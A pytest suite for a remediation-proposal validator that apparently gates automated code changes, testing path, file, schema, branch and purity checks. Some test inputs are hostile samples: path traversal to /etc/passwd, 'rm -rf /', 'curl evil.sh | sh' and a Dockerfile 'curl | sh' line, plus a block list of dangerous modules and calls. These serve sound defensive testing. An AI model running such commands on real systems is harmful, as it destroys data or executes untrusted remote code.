"""CYVRIX V3.1 — Action Model Unit Tests.

Covers: path validation, protected paths, per-type file allowlists,
operation schemas, scope caps, binding validation, expiry, version semantics.
"""
import os
import sys
from datetime import datetime, timezone

import pytest

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "apps", "api"))

from app.services import action_model as am
from app.services.action_model import (
    ActionType,
    OperationType,
    PathValidationError,
    ProposalValidationError,
    is_major_version_change,
    is_protected_path,
    normalize_and_validate_path,
    proposal_expiry,
    validate_base_commit_sha,
    validate_expected_diff,
    validate_files_for_action_type,
    validate_operation,
    validate_operations,
    validate_proposal_content,
    validate_rationale,
    validate_target_branch,
)


# ═══════════════════════════════════════════════════════════════════
# Path Validation
# ═══════════════════════════════════════════════════════════════════

class TestPathValidation:
    @pytest.mark.parametrize("path", [
        "package.json", "src/index.ts", "docker/app.Dockerfile",
        "a/b/c/requirements.txt", "SECURITY.md",
    ])
    def test_valid_paths(self, path):
        assert normalize_and_validate_path(path) == path

    @pytest.mark.parametrize("path", [
        "../etc/passwd",
        "a/../../etc/passwd",
        "..",
        "/etc/passwd",
        "//etc/passwd",
        "C:\\Users\\x",
        "C:/Users/x",
        "\\\\server\\share",
        "src\\file.ts",
        "~/secrets",
        "package%2e%2e.json",
        "a/../b",
        "file\x00.json",
        "a\x1f.json",
        "",
        None,
        123,
        ["x"],
        "a//b",
        "a/b/",
    ])
    def test_rejected_paths(self, path):
        with pytest.raises(PathValidationError):
            normalize_and_validate_path(path)

    def test_path_too_long(self):
        with pytest.raises(PathValidationError):
            normalize_and_validate_path("a" * 1001)

    def test_unicode_conservative_allowlist(self):
        # Conservative ASCII-only allowlist rejects stable non-ASCII paths (homoglyph policy)
        with pytest.raises(PathValidationError):
            normalize_and_validate_path("café.md")

    def test_unicode_mixed_normalization_rejected(self):
        # NFD form changes under NFC for non-ASCII → ambiguous → reject
        with pytest.raises(PathValidationError):
            normalize_and_validate_path("cafe\u0301.md")


# ═══════════════════════════════════════════════════════════════════
# Protected Paths
# ═══════════════════════════════════════════════════════════════════

class TestProtectedPaths:
    @pytest.mark.parametrize("path,category", [
        (".github/workflows/ci.yml", "CI_WORKFLOWS"),
        ("deploy/prod.sh", "DEPLOYMENT_CONFIG"),
        ("config/.env.production", "SECRETS_CONFIG"),
        ("certs/server.pem", "SECRETS_CONFIG"),
        ("src/auth/login.py", "AUTHENTICATION"),
        ("app/middleware/rate.py", "SECURITY_MIDDLEWARE"),
        (".ssh/id_rsa", "INFRA_CREDENTIALS"),
        ("audit/chain.py", "AUDIT_INTEGRITY"),
        ("policy/rules.json", "POLICY_DEFINITIONS"),
        ("lib/native.so", "BINARY"),
    ])
    def test_protected(self, path, category):
        assert is_protected_path(path) == category

    @pytest.mark.parametrize("path", [
        "package.json", "src/index.ts", "Dockerfile", "README.md",
        "requirements.txt",
    ])
    def test_not_protected(self, path):
        assert is_protected_path(path) is None


# ═══════════════════════════════════════════════════════════════════
# Per-Type File Allowlists
# ═══════════════════════════════════════════════════════════════════

class TestFileAllowlists:
    def test_dependency_upgrade_manifests(self):
        files = validate_files_for_action_type(
            "DEPENDENCY_UPGRADE", ["package.json", "package-lock.json"], None
        )
        assert files == ["package.json", "package-lock.json"]

    def test_dependency_upgrade_rejects_source(self):
        with pytest.raises(ProposalValidationError):
            validate_files_for_action_type("DEPENDENCY_UPGRADE", ["src/index.ts"], None)

    def test_dockerfile_update(self):
        files = validate_files_for_action_type("DOCKERFILE_UPDATE", ["Dockerfile"], None)
        assert files == ["Dockerfile"]

    def test_dockerfile_named_variant(self):
        files = validate_files_for_action_type("DOCKERFILE_UPDATE", ["docker/app.Dockerfile"], None)
        assert files == ["docker/app.Dockerfile"]

    def test_configuration_update_denied_by_default(self):
        # Empty allowlist by design → everything denied
        with pytest.raises(ProposalValidationError):
            validate_files_for_action_type("CONFIGURATION_UPDATE", ["config/settings.yml"], None)

    def test_documented_fix_md_only(self):
        assert validate_files_for_action_type(
            "DOCUMENTED_SECURITY_FIX", ["SECURITY.md"], None
        ) == ["SECURITY.md"]
        with pytest.raises(ProposalValidationError):
            validate_files_for_action_type("DOCUMENTED_SECURITY_FIX", ["app.py"], None)

    def test_duplicate_files_rejected(self):
        with pytest.raises(ProposalValidationError):
            validate_files_for_action_type(
                "DEPENDENCY_UPGRADE", ["package.json", "package.json"], None
            )

    def test_file_cap(self):
        with pytest.raises(ProposalValidationError):
            validate_files_for_action_type(
                "DOCUMENTED_SECURITY_FIX", [f"docs/{i}.md" for i in range(11)], None
            )

    def test_evidence_narrowing_subset(self):
        evidence = {"dockerfile": "docker/Dockerfile"}
        assert validate_files_for_action_type(
            "DOCKERFILE_UPDATE", ["docker/Dockerfile"], evidence
        ) == ["docker/Dockerfile"]
        with pytest.raises(ProposalValidationError):
            validate_files_for_action_type("DOCKERFILE_UPDATE", ["Dockerfile"], evidence)


# ═══════════════════════════════════════════════════════════════════
# Operation Schemas
# ═══════════════════════════════════════════════════════════════════

class TestOperationSchemas:
    def test_dependency_version_op_valid(self):
        op = validate_operation(
            {
                "type": "UPDATE_DEPENDENCY_VERSION", "file": "package.json",
                "name": "lodash", "ecosystem": "npm",
                "from_version": "4.17.19", "to_version": "4.17.21",
            },
            "DEPENDENCY_UPGRADE", ["package.json"],
        )
        assert op["to_version"] == "4.17.21"

    def test_unknown_operation_type_rejected(self):
        with pytest.raises(ProposalValidationError):
            validate_operation(
                {"type": "SHELL_COMMAND", "file": "x", "command": "rm -rf /"},
                "DEPENDENCY_UPGRADE", ["package.json"],
            )

    def test_operation_type_mismatch_action(self):
        with pytest.raises(ProposalValidationError):
            validate_operation(
                {"type": "UPDATE_DEPENDENCY_VERSION", "file": "package.json",
                 "name": "lodash", "ecosystem": "npm",
                 "from_version": "4.17.19", "to_version": "4.17.21"},
                "DOCKERFILE_UPDATE", ["Dockerfile"],
            )

    def test_unknown_fields_rejected(self):
        with pytest.raises(ProposalValidationError):
            validate_operation(
                {"type": "UPDATE_DEPENDENCY_VERSION", "file": "package.json",
                 "name": "lodash", "ecosystem": "npm",
                 "from_version": "4.17.19", "to_version": "4.17.21",
                 "command": "curl evil.sh | sh"},
                "DEPENDENCY_UPGRADE", ["package.json"],
            )

    def test_file_outside_declared_scope_rejected(self):
        with pytest.raises(ProposalValidationError):
            validate_operation(
                {"type": "UPDATE_DEPENDENCY_VERSION", "file": "src/other.json",
                 "name": "lodash", "ecosystem": "npm",
                 "from_version": "4.17.19", "to_version": "4.17.21"},
                "DEPENDENCY_UPGRADE", ["package.json"],
            )

    def test_version_range_rejected(self):
        for bad in ("^4.17.19", "~4.17.19", "*", ">=4.0"):
            with pytest.raises(ProposalValidationError):
                validate_operation(
                    {"type": "UPDATE_DEPENDENCY_VERSION", "file": "package.json",
                     "name": "lodash", "ecosystem": "npm",
                     "from_version": "4.17.19", "to_version": bad},
                    "DEPENDENCY_UPGRADE", ["package.json"],
                )

    def test_same_version_rejected(self):
        with pytest.raises(ProposalValidationError):
            validate_operation(
                {"type": "UPDATE_DEPENDENCY_VERSION", "file": "package.json",
                 "name": "lodash", "ecosystem": "npm",
                 "from_version": "4.17.19", "to_version": "4.17.19"},
                "DEPENDENCY_UPGRADE", ["package.json"],
            )

    def test_dockerfile_op_valid(self):
        op = validate_operation(
            {"type": "UPDATE_DOCKERFILE_INSTRUCTION", "file": "Dockerfile",
             "line_no": 3, "old_text": "USER root", "new_text": "USER app"},
            "DOCKERFILE_UPDATE", ["Dockerfile"],
        )
        assert op["line_no"] == 3

    def test_dockerfile_curl_pipe_shell_rejected(self):
        with pytest.raises(ProposalValidationError):
            validate_operation(
                {"type": "APPEND_DOCKERFILE_INSTRUCTION", "file": "Dockerfile",
                 "after_line": 1, "instruction": "RUN curl http://x | sh"},
                "DOCKERFILE_UPDATE", ["Dockerfile"],
            )

    def test_missing_fields_rejected(self):
        with pytest.raises(ProposalValidationError):
            validate_operation(
                {"type": "UPDATE_DEPENDENCY_VERSION", "file": "package.json"},
                "DEPENDENCY_UPGRADE", ["package.json"],
            )

    def test_duplicate_operations_rejected(self):
        op = {"type": "UPDATE_DEPENDENCY_VERSION", "file": "package.json",
              "name": "lodash", "ecosystem": "npm",
              "from_version": "4.17.19", "to_version": "4.17.21"}
        with pytest.raises(ProposalValidationError):
            validate_operations([op, dict(op)], "DEPENDENCY_UPGRADE", ["package.json"])

    def test_operation_cap(self):
        ops = [
            {"type": "UPDATE_DOCKERFILE_INSTRUCTION", "file": "Dockerfile",
             "line_no": i, "old_text": f"X{i}", "new_text": f"Y{i}"}
            for i in range(1, 52)
        ]
        with pytest.raises(ProposalValidationError):
            validate_operations(ops, "DOCKERFILE_UPDATE", ["Dockerfile"])


# ═══════════════════════════════════════════════════════════════════
# Bindings / Expiry / Diff
# ═══════════════════════════════════════════════════════════════════

class TestBindingsAndExpiry:
    def test_valid_sha(self):
        assert validate_base_commit_sha("a" * 40) == "a" * 40

    @pytest.mark.parametrize("sha", ["abc123", "A" * 40, "g" * 40, "a" * 39, None, 123])
    def test_invalid_sha(self, sha):
        with pytest.raises(ProposalValidationError):
            validate_base_commit_sha(sha)

    @pytest.mark.parametrize("branch", ["cyvrix/fix-lodash", "remediation-1", "fix.1"])
    def test_valid_branch(self, branch):
        assert validate_target_branch(branch) == branch

    @pytest.mark.parametrize("branch", [
        "", None, "a/../b", "-flag", "branch with spaces", "x" * 256, "a..b",
    ])
    def test_invalid_branch(self, branch):
        with pytest.raises(ProposalValidationError):
            validate_target_branch(branch)

    def test_rationale_bounds(self):
        assert validate_rationale("ok") == "ok"
        with pytest.raises(ProposalValidationError):
            validate_rationale("x" * 2001)

    def test_diff_line_cap(self):
        with pytest.raises(ProposalValidationError):
            validate_expected_diff("\n" * 501)

    def test_diff_size_cap(self):
        with pytest.raises(ProposalValidationError):
            validate_expected_diff("x" * 50_001)

    def test_expiry_is_server_derived_24h(self):
        created = datetime(2026, 9, 7, 12, 0, 0, tzinfo=timezone.utc)
        assert proposal_expiry(created) == datetime(2026, 9, 8, 12, 0, 0, tzinfo=timezone.utc)

    def test_expiry_naive_input_gets_utc(self):
        created = datetime(2026, 9, 7, 12, 0, 0)
        assert proposal_expiry(created).tzinfo is not None


# ═══════════════════════════════════════════════════════════════════
# Whole-Proposal Validation
# ═══════════════════════════════════════════════════════════════════

VALID_PAYLOAD = {
    "action_type": "DEPENDENCY_UPGRADE",
    "files": ["package.json"],
    "operations": [{
        "type": "UPDATE_DEPENDENCY_VERSION", "file": "package.json",
        "name": "lodash", "ecosystem": "npm",
        "from_version": "4.17.19", "to_version": "4.17.21",
    }],
    "expected_diff": "-  \"lodash\": \"4.17.19\"\n+  \"lodash\": \"4.17.21\"",
    "target_branch": "cyvrix/fix-lodash",
    "base_commit_sha": "a" * 40,
    "rationale": "Upgrade lodash to patched version",
}


class TestWholeProposalValidation:
    def test_valid_payload(self):
        content = validate_proposal_content(VALID_PAYLOAD)
        assert content.action_type == "DEPENDENCY_UPGRADE"
        assert content.files == ["package.json"]

    def test_unknown_top_level_field_rejected(self):
        payload = {**VALID_PAYLOAD, "execute_now": True}
        with pytest.raises(ProposalValidationError):
            validate_proposal_content(payload)

    def test_unknown_action_type_rejected(self):
        payload = {**VALID_PAYLOAD, "action_type": "SHELL_COMMAND"}
        with pytest.raises(ProposalValidationError):
            validate_proposal_content(payload)

    def test_missing_action_type_rejected(self):
        payload = {k: v for k, v in VALID_PAYLOAD.items() if k != "action_type"}
        with pytest.raises(ProposalValidationError):
            validate_proposal_content(payload)

    def test_payload_not_dict_rejected(self):
        with pytest.raises(ProposalValidationError):
            validate_proposal_content("package.json")


# ═══════════════════════════════════════════════════════════════════
# Version Semantics
# ═══════════════════════════════════════════════════════════════════

class TestVersionSemantics:
    @pytest.mark.parametrize("frm,to,major", [
        ("4.17.19", "4.17.21", False),
        ("4.17.19", "5.0.0", True),
        ("1.2.3", "2.0.0", True),
        ("2.7.18", "2.7.18", False),
        ("latest", "1.0.0", True),  # unparseable → conservative major
        ("1.0.0", "beta", True),
    ])
    def test_major_detection(self, frm, to, major):
        assert is_major_version_change(frm, to) is major


# ═══════════════════════════════════════════════════════════════════
# Purity — the action model must have zero side-effect capability
# ═══════════════════════════════════════════════════════════════════

class TestPurity:
    FORBIDDEN_MODULES = {
        "subprocess", "socket", "httpx", "requests", "urllib", "shutil",
        "ctypes", "multiprocessing", "asyncio",
    }
    FORBIDDEN_CALLS = {"eval", "exec", "compile", "open", "system", "popen"}

    def test_no_side_effect_imports_or_calls(self):
        """AST-level purity: no forbidden imports, no dangerous builtins.
        Docstrings are irrelevant — only real code is checked."""
        import ast
        import inspect
        tree = ast.parse(inspect.getsource(am))
        for node in ast.walk(tree):
            if isinstance(node, ast.Import):
                for alias in node.names:
                    root = alias.name.split(".")[0]
                    assert root not in self.FORBIDDEN_MODULES, root
            if isinstance(node, ast.ImportFrom):
                root = (node.module or "").split(".")[0]
                assert root not in self.FORBIDDEN_MODULES, root
            if isinstance(node, ast.Call):
                func = node.func
                if isinstance(func, ast.Name):
                    # Bare builtin calls: eval(...), exec(...), open(...)
                    assert func.id not in self.FORBIDDEN_CALLS, func.id
                elif isinstance(func, ast.Attribute):
                    owner = getattr(func.value, "id", None)
                    if owner == "os":
                        assert func.attr not in {"system", "popen", "exec", "spawn"}

    def test_module_imports_only_stdlib_safe(self):
        import ast
        import inspect
        tree = ast.parse(inspect.getsource(am))
        allowed = {"re", "unicodedata", "dataclasses", "datetime", "enum", "fnmatch", "typing"}
        for node in ast.walk(tree):
            if isinstance(node, (ast.Import, ast.ImportFrom)):
                mods = [a.name for a in node.names] if isinstance(node, ast.Import) else [node.module or ""]
                for m in mods:
                    assert m.split(".")[0] in allowed, f"unexpected import: {m}"
